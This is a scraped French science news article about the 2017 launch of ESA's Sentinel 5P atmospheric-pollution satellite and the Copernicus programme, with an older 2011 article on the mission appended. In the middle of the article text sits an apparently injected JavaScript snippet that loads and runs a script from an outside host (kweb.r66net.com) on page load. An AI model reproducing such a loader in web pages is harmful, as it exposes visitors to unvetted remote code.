{"title": "Sentinel 5P : un satellite pour mesurer les polluants dans l'atmosphère", "newspaper": "Futura Sciences", "author": "Rémy Decourt", "date_publi": "13/10/2017", "content": "La pollution des villes est désormais surveillée par un satellite. Sentinel 5P, de l'ESA, de la famille dite Copernicus, vient d'être mis en orbite ce vendredi. Il analysera la chimie de l'atmosphère et servira aussi à mieux comprendre l'évolution du climat. Satellite Sentinel 5 Precursor de l’Esa                       Un satellite Sentinel, d’étude de la chimie atmosphérique, en orbite autour de la Terre (vue d’artiste). © Astrium                                       Ce matin, à 9 h 27 TU (11 h 27 en Métropole), un nouveau satellite Sentinel du programme Copernicus de la Commission européenne a été lancé depuis le cosmodrome de Plesetsk, en Russie, à bord d'un lanceur Rockot. Construit par Airbus, pour le compte de l' Agence spatiale européenne  (ESA), Sentinel 5P (P pour précurseur) préfigure la famille Sentinel 5, celle de « Copernicus ». Cet hommage à Nicolas Copernic ne désigne pas une série de satellites mais une charge utile à bord du satellite de  météorologie  en  orbite  polaire héliosynchrone de deuxième génération ( Metop SG ), dont le premier exemplaire sera lancé en 2021.  Sentinel 5P est le premier satellite Copernicus à se focaliser sur l' atmosphère . Il a été mis au point pour assurer la continuité des observations de l'instrument Sciamachy du  satellite Envisat  de l'ESA, en attendant que Sentinel 5 ne prenne la relève. Le satellite Sentinel 5P mis sous la coiffe du lanceur Rockot, un missile reconverti pour le lancement de satellites. © Eurockot                               La pollution sous surveillance Cette sentinelle embarque l'instrument Tropomi, également construit par Airbus, qui a la capacité inédite en orbite de mesurer les  concentrations d’aérosols  et de nombreux gaz à l'état de traces, comme le dioxyde d' azote , l' ozone , le formaldéhyde, le dioxyde de  soufre , le méthane, le monoxyde de carbone et les aérosols. Ces gaz, tous présents dans l'air que nous respirons, influent sur notre santé et le climat de la planète.   ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Tropomi aura une résolution plus élevée que les instruments précédents. Elle sera de 3,5 x 7 km 2 , ce qui permettra de surveiller la pollution de l'air au-dessus des villes et de détecter, d'identifier et quantifier localement les sources de pollution et leurs variations. Les données de Tropomi serviront également à améliorer significativement les  modèles climatiques  ainsi que notre connaissance de la formation des « trous » dans la couche d'ozone. Dans le cadre du volet sécurité de Copernicus, les données de Sentinel 5P seront utiles aux organismes en charge de la sécurité aériennes pour la surveillance des  cendres volcaniques  et les services publics de santé, tel que l'OMS, qui surveillent les niveaux anormalement élevés de  rayonnement UV , capables d'engendrer des cancers de la peau. Le saviez-vous ? Le programme Copernicus, de la Commission européenne, est destiné à la surveillance du milieu marin, de l'atmosphère, des terres et du changement climatique. L'idée est fournir une vue globale de l'état de la Terre à un instant T, pour mieux mesurer le changement climatique. Il vient aussi en appui pour les interventions d'urgence et de sécurité.  Sa composante spatiale compte à ce jour 6 familles de satellites. Sentinel 1  : observations radar de jour et de nuit des terres émergées et des océans ;  Sentinel 2  : observation optique de moyenne résolution des terres émergées ;  Sentinel 3  : observation des océans et des terres par optique multispectrale, infrarouge et altimétrie ;  Sentinel 4 : étude de la pollution atmosphérique depuis l'orbite géostationnaire ;  Sentinel 5 : étude de la chimie de l'atmosphère depuis l'orbite basse ;  Sentinel 6  : continuité opérationnelle des missions altimétriques Jason, c’est-à-dire de la mesure du niveau des océans et des mers. Soulignons que ces satellites sont particulièrement innovants sur le plan technique et que les données de Copernicus sont totalement accessibles et gratuites, dans certaines limites. Pour en savoir plus Sentinel 5 Precursor, un satellite pour étudier l'atmosphère Article de Rémy Decourt publié le 12/12/2011 Sentinel 5 Precursor, alias S5p, futur satellite d'étude de la  chimie  atmosphérique de l'Agence spatiale européenne, sera construit par Astrium et lancé en 2015. Après avoir octroyé les contrats de maîtrise d'œuvre de Sentinel 1 et 3 à Thales Alenia Space et Sentinelle 2 à Astrium, l'Agence spatiale européenne vient d'attribuer celui de la mission Sentinel 5 Precursor (S5p). Ce satellite sera lancé en 2015 pour une  durée  de vie nominale de sept ans.  S5P est spécifiquement dédié à l'étude de la  chimie atmosphérique . Il mesurera l'ozone, le dioxyde d'azote, le dioxyde de soufre et d'autres polluants atmosphériques avec une précision supérieure à celle des instruments existants, permettant ainsi d'optimiser la qualité des modèles climatiques et des  prévisions météorologiques . Vidéo de présentation de Sentinelle 5 © Astrium  Dans ce domaine, il prendra le relais des satellites environnementaux Envisat qui arrivent en fin de vie et  ERS-2, en cours de désorbitation . Comme son nom l'indique, il est le précurseur de l'instrument opérationnel Sentinel 5 qui sera embarqué sur les  satellites MetOp  de deuxième génération ( MetOp  SG) en orbite polaire. S5p est une nécessité pour les climatologues qui veulent éviter une rupture des données, nécessaires pour comprendre la machine climatique. Des sentinelles pour surveiller la planète Terre Quant à Sentinel 5, il fait partie d'une série de 5 satellites opérationnels dits Sentinel, destinés à la  surveillance de la Terre  dans le cadre du programme pour la Surveillance mondiale pour l'environnement et la sécurité ( GMES , Copernicus aujourd'hui) de l'Union européenne dont les 29 ministres du Conseil Espace Esa-UE ont de nouveau souligné l'importance, malgré les problèmes de financement qui perturbent le déploiement de GMES. Les autres satellites de la série sont Sentinel 1, qui doit assurer la continuité des données  SAR  depuis les satellites ERS, et Sentinel 2 et 3 dédiés à la surveillance des terres et des océans. Les deux autres sont Sentinel 4 et 5 conçus pour des missions de météorologie et de  climatologie  par l'étude de la composition de l'atmosphère. ", "theme": "sciences"}